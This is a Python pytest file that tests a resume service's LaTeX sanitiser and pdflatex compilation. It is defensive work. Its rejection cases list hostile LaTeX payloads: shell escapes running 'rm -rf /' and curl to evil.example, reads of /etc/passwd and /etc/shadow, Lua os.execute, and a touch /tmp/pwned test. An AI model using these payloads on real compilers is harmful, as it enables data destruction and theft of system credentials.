"""Part 9: LaTeX sanitisation and compilation.

Sanitiser tests run everywhere. Compilation tests need pdflatex and so run only
against the runtime image (`make test-runtime`).
"""

from __future__ import annotations

import shutil
from pathlib import Path

import pytest

from app.compile.latex import LatexCompiler, compile_latex
from app.compile.sanitize import MAX_LATEX_CHARS, sanitize_latex

FIXTURES = Path(__file__).parent / "fixtures"
REAL_RESUME = (FIXTURES / "real_resume.tex").read_text(encoding="utf-8")

MINIMAL = r"""\documentclass{article}
\begin{document}
Hello.
\end{document}
"""

needs_latex = pytest.mark.skipif(
    shutil.which("pdflatex") is None, reason="pdflatex not installed (fast test image)"
)


# ── Sanitiser: what must be rejected ─────────────────────────────────────
@pytest.mark.parametrize(
    "payload",
    [
        r"\immediate\write18{rm -rf /}",
        r"\write18{curl evil.example}",
        r"\input{/etc/passwd}",
        r"\include{/etc/shadow}",
        r"\openout1=/tmp/x",
        r"\directlua{os.execute('id')}",
        r"\usepackage{shellesc}",
        r"\catcode`\%=12",
        r"\csname write18\endcsname",
    ],
)
def test_dangerous_primitives_are_rejected(payload):
    """Compiling untrusted LaTeX is arbitrary code execution unless constrained."""
    latex = MINIMAL.replace(r"Hello.", payload)
    result = sanitize_latex(latex)
    assert not result.ok
    assert result.rejections


def test_rejection_message_names_the_problem():
    """A rejection the user cannot understand is indistinguishable from a bug."""
    result = sanitize_latex(MINIMAL.replace("Hello.", r"\write18{ls}"))
    assert "write18" in result.message
    assert "shell" in result.message.lower()


def test_glyphtounicode_input_is_allowed():
    """Idiomatic in resume templates: it improves ATS text extraction, which is
    the entire point of this product."""
    latex = MINIMAL.replace("Hello.", r"\input{glyphtounicode}")
    assert sanitize_latex(latex).ok


def test_other_inputs_are_still_rejected_alongside_the_allowlisted_one():
    latex = MINIMAL.replace("Hello.", r"\input{glyphtounicode}\input{/etc/passwd}")
    assert not sanitize_latex(latex).ok


def test_commented_out_primitive_is_not_flagged():
    latex = MINIMAL.replace("Hello.", "% \\write18{ls}\nHello.")
    assert sanitize_latex(latex).ok


def test_escaped_percent_does_not_truncate_the_line():
    """Resumes are full of percentages: 'reduced costs by 60\\%'.

    Treating \\% as a comment start would silently delete the rest of the line,
    including any legitimate content -- and would also hide a primitive after it.
    """
    latex = MINIMAL.replace("Hello.", r"Reduced cost by 60\% \write18{ls}")
    result = sanitize_latex(latex)
    assert not result.ok, "the primitive after an escaped percent must still be caught"


# ── Sanitiser: structure ─────────────────────────────────────────────────
def test_empty_document_is_rejected():
    assert not sanitize_latex("").ok
    assert not sanitize_latex("   \n  ").ok


def test_fragment_without_documentclass_is_rejected():
    result = sanitize_latex(r"\begin{document}hi\end{document}")
    assert not result.ok
    assert any("documentclass" in r for r in result.rejections)


def test_missing_end_document_is_rejected():
    result = sanitize_latex(r"\documentclass{article}\begin{document}hi")
    assert not result.ok


def test_unbalanced_environment_is_reported_by_name():
    """pdflatex says '\\end occurred inside a group', which tells a user nothing."""
    latex = MINIMAL.replace("Hello.", r"\begin{itemize}\item x")
    result = sanitize_latex(latex)
    assert not result.ok
    assert any("itemize" in r for r in result.rejections)


def test_oversized_document_is_rejected():
    latex = MINIMAL.replace("Hello.", "x" * (MAX_LATEX_CHARS + 1))
    assert not sanitize_latex(latex).ok


def test_brace_imbalance_warns_rather_than_rejects():
    """Brace counting is confounded by escaped braces; pdflatex reports it better."""
    latex = MINIMAL.replace("Hello.", r"\textbf{unclosed")
    result = sanitize_latex(latex)
    assert result.warnings


# ── Sanitiser: the real template must pass ───────────────────────────────
def test_the_real_resume_passes_sanitisation():
    """The actual template uses \\input{glyphtounicode} and 10 custom macros.

    If the sanitiser rejected it, the product would not work for its only user.
    """
    result = sanitize_latex(REAL_RESUME)
    assert result.ok, result.message


# ── Compilation (runtime image only) ─────────────────────────────────────
@needs_latex
async def test_compiles_a_minimal_document(tmp_path):
    result = await compile_latex(MINIMAL, name="minimal", output_dir=tmp_path)
    assert result.ok, result.error
    assert Path(result.pdf_path).read_bytes().startswith(b"%PDF-")
    assert result.pages == 1


@needs_latex
async def test_compiles_the_real_resume(tmp_path):
    """The end-to-end proof: the actual template, with fontawesome5 and all 10
    custom macros, produces a real PDF."""
    result = await compile_latex(REAL_RESUME, name="real", output_dir=tmp_path)
    assert result.ok, f"{result.error}\n{result.log_excerpt}"
    assert result.pdf_bytes > 20_000, "a full resume should not be a near-empty PDF"
    assert result.pages <= 2


@needs_latex
async def test_dangerous_latex_never_reaches_pdflatex(tmp_path):
    result = await compile_latex(
        MINIMAL.replace("Hello.", r"\write18{touch /tmp/pwned}"),
        output_dir=tmp_path,
    )
    assert not result.ok
    assert "write18" in result.error


@needs_latex
async def test_missing_package_is_reported_actionably(tmp_path):
    """The single most common real failure, and pdflatex buries it in the log."""
    latex = MINIMAL.replace(
        r"\documentclass{article}",
        "\\documentclass{article}\n\\usepackage{definitely-not-a-real-package}",
    )
    result = await compile_latex(latex, output_dir=tmp_path)
    assert not result.ok
    assert "package" in result.error.lower()
    assert "definitely-not-a-real-package" in result.error


@needs_latex
async def test_undefined_command_is_reported_with_its_name(tmp_path):
    result = await compile_latex(
        MINIMAL.replace("Hello.", r"\notARealCommand"), output_dir=tmp_path
    )
    assert not result.ok
    assert "notARealCommand" in result.error or "Unknown LaTeX command" in result.error


@needs_latex
async def test_error_is_one_sentence_not_a_log_dump(tmp_path):
    """NFR-05.4: actionable messages. A 400-line log is not actionable."""
    latex = MINIMAL.replace(r"\documentclass{article}", r"\documentclass{article}\usepackage{nope}")
    result = await compile_latex(latex, output_dir=tmp_path)
    assert len(result.error) < 300
    assert result.log_excerpt, "the full detail should still be available separately"


@needs_latex
async def test_maths_mode_error_is_explained(tmp_path):
    result = await compile_latex(MINIMAL.replace("Hello.", "C_plus_plus"), output_dir=tmp_path)
    if not result.ok:
        assert "maths" in result.error.lower() or "math" in result.error.lower()


@needs_latex
async def test_compilation_is_reproducible(tmp_path):
    """Identical input must produce identical content.

    SOURCE_DATE_EPOCH plus FORCE_SOURCE_DATE removes the timestamp -- pdfTeX
    ignores the epoch without the second variable. What remains is the /ID
    trailer, which pdfTeX derives from the output path, so it differs between two
    temp directories and nowhere else. `content_hash` excludes it, which is what
    caching and change-detection actually want.
    """
    first = await compile_latex(MINIMAL, name="a", output_dir=tmp_path)
    second = await compile_latex(MINIMAL, name="b", output_dir=tmp_path)
    assert first.ok and second.ok
    assert first.content_hash == second.content_hash
    assert first.pdf_bytes == second.pdf_bytes


@needs_latex
async def test_content_hash_changes_when_content_changes(tmp_path):
    """The hash must not be so lenient that it misses a real edit."""
    first = await compile_latex(MINIMAL, name="c", output_dir=tmp_path)
    second = await compile_latex(
        MINIMAL.replace("Hello.", "Goodbye."), name="d", output_dir=tmp_path
    )
    assert first.content_hash != second.content_hash


@needs_latex
async def test_only_the_pdf_id_differs_between_identical_compiles(tmp_path):
    """Pins the precise claim above, so a regression is diagnosable."""
    from app.compile.latex import _PDF_ID_RE

    first = await compile_latex(MINIMAL, name="e", output_dir=tmp_path)
    second = await compile_latex(MINIMAL, name="f", output_dir=tmp_path)
    a = _PDF_ID_RE.sub(b"", Path(first.pdf_path).read_bytes())
    b = _PDF_ID_RE.sub(b"", Path(second.pdf_path).read_bytes())
    assert a == b


@needs_latex
async def test_long_document_warns_about_page_count(tmp_path):
    filler = "\n\n".join(["Lorem ipsum dolor sit amet. " * 40] * 30)
    result = await compile_latex(MINIMAL.replace("Hello.", filler), output_dir=tmp_path)
    assert result.ok
    if result.pages > 2:
        assert any("page" in w.lower() for w in result.warnings)


@needs_latex
async def test_timeout_is_enforced(tmp_path, monkeypatch):
    """A TeX infinite loop is a real possibility with user-supplied macros."""
    compiler = LatexCompiler(tmp_path)
    compiler.timeout = 1
    infinite = MINIMAL.replace("Hello.", r"\newcommand{\loop}{\loop}\loop")
    result = await compiler.compile(infinite)
    assert not result.ok
